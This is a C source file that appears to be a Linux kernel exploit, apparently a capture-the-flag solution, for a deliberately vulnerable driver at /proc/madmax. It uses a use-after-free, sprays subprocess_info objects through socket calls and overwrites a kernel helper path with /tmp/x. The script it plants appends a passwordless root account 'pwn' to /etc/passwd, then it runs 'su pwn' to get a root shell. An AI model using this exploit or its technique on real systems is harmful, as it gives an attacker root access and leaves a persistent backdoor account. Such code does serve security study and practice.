#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <string.h>
#include <inttypes.h>
#include <sys/types.h>  
#include <sys/socket.h>

#define MAX_ALLOC 10
#define BUFSIZE_TANKER 0x40
#define VULN_DEV "/proc/madmax"
#define CREATE_TANKER 0x102
#define FREE_RIG 0x101
#define CREATE_RIG 0x100
#define READ_FUEL 0x103
#define WRITE_FUEL 0x104

// kmalloc-128

typedef struct {
	uint64_t index;
	char buf[BUFSIZE_TANKER];
} ktank_t;

typedef struct {
	uint64_t index;
	uint64_t data;
} kinput_t;

static int fd;

static void logleak(char *s, uint64_t addr){
	printf("[*] %s => %#lx", s, addr);
}

static int open_dev(char *file, int flags){
	if ((fd = open(file, flags)) < 0 ){
		perror("[-] device open error");
		exit(1);
	}

	printf("[*] Opened device\n");
}

static void create_tanker(void* buf, uint64_t idx){
	ktank_t data = {
		.index = idx
	};

	memcpy(data.buf, buf, BUFSIZE_TANKER);

	ioctl(fd, CREATE_TANKER, &data);
}

static void free_rig(uint64_t idx){
	ioctl(fd, FREE_RIG, &idx);
}

static void create_rig(uint64_t idx){
	ioctl(fd, CREATE_RIG, &idx);
}

static uint64_t read_fuel(uint64_t idx){
	kinput_t in = {
		.index = idx,
		.data = 0
	};
	ioctl(fd, READ_FUEL, &in);
	return in.data;
}

static void stop(char *s){
	printf("%s\n", s);
	getchar();
}

static void write_fuel(uint64_t val, uint64_t idx){
	kinput_t in = {
		.index = idx,
		.data = val
	};

	ioctl(fd, WRITE_FUEL, &in);
}

static void write_file(const char *file, const char *data, mode_t mode){
	int f = open(file, O_WRONLY | O_CREAT | O_TRUNC, mode);
	if (f < 0){perror("[-] open"); exit(1);}
	if(write(f, data, strlen(data)) < 0){perror("[-] write"); exit(1);}
	close(f);
}

int main(int argc, char const *argv[])
{
	
	open_dev(VULN_DEV, O_RDWR);

	uint64_t tanks[MAX_ALLOC];
	uint64_t rigs[MAX_ALLOC];

	char buf[0x40] = {0};

	for (uint64_t i = 0; i < MAX_ALLOC; i++){
		create_rig(i);
	}

	for (uint64_t i = 0; i < MAX_ALLOC; i++){
		free_rig(i);
	}
	
	printf("[+] Spraying subprocess_info\n");
	for(uint64_t i = 0; i < MAX_ALLOC; i++){
		socket(22, AF_INET, 0);
	}

	printf("[*] Most likely the object fell into index 9, if it didn't, try again.\n");

	const char *new_path = "/tmp/x\x00";
	uint64_t val = 0;

	memcpy(&val, new_path, sizeof(uint64_t));

	const char* script = "#!/bin/sh\necho \"pwn::0:0:root:/root:/bin/sh\" >> /etc/passwd";
	write_file(new_path, script, 0777);

	const unsigned char magic[4] = {0xff, 0xff, 0xff, 0xff};
	write_file("/tmp/dummy", (char*)magic, 0777);

	write_fuel(val, 9);

	stop("asd");

	system("/tmp/dummy >/dev/null 2>&1");
	system("su pwn 2>/dev/null");

	return 0;
}
